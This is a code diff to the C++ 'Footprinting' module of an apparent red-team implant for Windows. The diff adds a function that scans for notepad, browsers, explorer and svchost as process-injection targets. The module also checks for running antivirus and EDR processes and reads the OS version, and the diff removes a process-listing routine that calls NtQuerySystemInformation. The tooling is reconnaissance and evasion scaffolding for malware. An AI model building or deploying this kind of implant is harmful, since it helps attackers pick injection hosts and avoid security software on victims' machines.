@@ -41,20 +41,32 @@ bool Footprinting::IsProcessRunning(const std::wstring& processName) {
 }
 
 DWORD Footprinting::GetProcessId(const std::wstring& processName) {
-    // Use the existing module's function
-    // Cast const wchar_t* to PWCHAR (safe if function doesn't modify, which it shouldn't)
     return GetPidFromNtQuerySystemInformationW((PWCHAR)processName.c_str());
 }
 
+DWORD Footprinting::FindInjectionTarget() {
+    std::vector<std::wstring> targets = {
+        L"notepad.exe",
+        L"chrome.exe", 
+        L"msedge.exe", 
+        L"firefox.exe", 
+        L"explorer.exe",
+        L"svchost.exe"
+    };
+
+    for (const auto& target : targets) {
+        DWORD pid = GetProcessId(target);
+        #ifdef DEBUG
+        std::wcout << L"[Footprinting] Checking " << target << L": " << pid << std::endl;
+        #endif
+        if (pid != 0) {
+            return pid;
+        }
+    }
+    return 0;
+}
+
 std::string Footprinting::GetOSVersion() {
-    // Basic version check using VerifyVersionInfo or similar
-    // Since GetVersionEx is deprecated/manifest-dependent, we'll try a simple approach
-    // or just return a placeholder if we want to avoid complexity.
-    // For now, let's use a simple heuristic or just "Windows"
-    
-    // A better way for red teaming is reading from KUSER_SHARED_DATA (0x7FFE0000)
-    // but let's stick to WinAPI for simplicity in this step.
-    
     if (IsWindows10OrGreater()) return "Windows 10+";
     if (IsWindows8Point1OrGreater()) return "Windows 8.1";
     if (IsWindows8OrGreater()) return "Windows 8";
@@ -85,76 +97,18 @@ bool Footprinting::CheckDomainJoinStatus() {
 
 std::vector<std::string> Footprinting::GetSecurityProducts() {
     std::vector<std::string> products;
-    // Basic check for common AV processes
-    // This is a simple list, in a real scenario we'd use WMI or more stealthy methods
     std::vector<std::wstring> targets = {
         L"MsMpEng.exe", L"cb.exe", L"cylance.exe", L"mcshield.exe"
     };
 
     for (const auto& target : targets) {
         if (IsProcessRunning(target)) {
-            std::string name(target.begin(), target.end());
+            std::string name;
+            for(wchar_t c : target) name += (char)c;
             products.push_back(name);
         }
     }
     return products;
-}
-
-
-
-std::vector<ProcessInfo> Footprinting::GetProcessList() {
-    std::vector<ProcessInfo> processList;
-    
-    // Logic adapted from GetPidFromNtQuerySystemInformation.cc
-    NTQUERYSYSTEMINFORMATION NtQuerySystemInformation = NULL;
-    DWORD Length = 0;
-    PMY_SYSTEM_PROCESS_INFORMATION ProcessInformationPointer = NULL;
-    HMODULE hModule = NULL;
-    NTSTATUS Status = STATUS_SUCCESS;
-    PMY_SYSTEM_PROCESS_INFORMATION Process = NULL;
-
-    hModule = GetModuleHandleEx2W(L"ntdll.dll");
-    if (hModule == NULL) return processList;
-
-    NtQuerySystemInformation = (NTQUERYSYSTEMINFORMATION)GetProcAddress(hModule, "NtQuerySystemInformation");
-    if (!NtQuerySystemInformation) return processList;
-
-    // Initial size guess
-    Length = 1024 * 1024; 
-    Process = (PMY_SYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeapFromTeb(), HEAP_ZERO_MEMORY, Length);
-    if (Process == NULL) return processList;
-
-    Status = NtQuerySystemInformation(SystemProcessInformation, Process, Length, &Length);
-    if (!NT_SUCCESS(Status)) {
-        HeapFree(GetProcessHeapFromTeb(), HEAP_ZERO_MEMORY, Process);
-        return processList;
-    }
-
-    ProcessInformationPointer = Process;
-    do {
-        if (ProcessInformationPointer->ImageName.Buffer) {
-            std::wstring wName(ProcessInformationPointer->ImageName.Buffer, ProcessInformationPointer->ImageName.Length / sizeof(WCHAR));
-            std::string name(wName.begin(), wName.end()); // Simple conversion
-            DWORD pid = HandleToLong(ProcessInformationPointer->UniqueProcessId);
-            DWORD sessionId = ProcessInformationPointer->SessionId;
-            
-            ProcessInfo info;
-            info.pid = pid;
-            info.name = name;
-            info.session_id = sessionId;
-            info.is_system = (sessionId == 0);
-            
-            processList.push_back(info);
-        }
-
-        if (ProcessInformationPointer->NextEntryOffset == 0) break;
-        ProcessInformationPointer = (PMY_SYSTEM_PROCESS_INFORMATION)(((PBYTE)ProcessInformationPointer) + ProcessInformationPointer->NextEntryOffset);
-
-    } while (true);
-
-    if (Process) HeapFree(GetProcessHeapFromTeb(), HEAP_ZERO_MEMORY, Process);
-
-    return processList;
 }
 
 IntegrityLevel Footprinting::GetIntegrityLevel() {
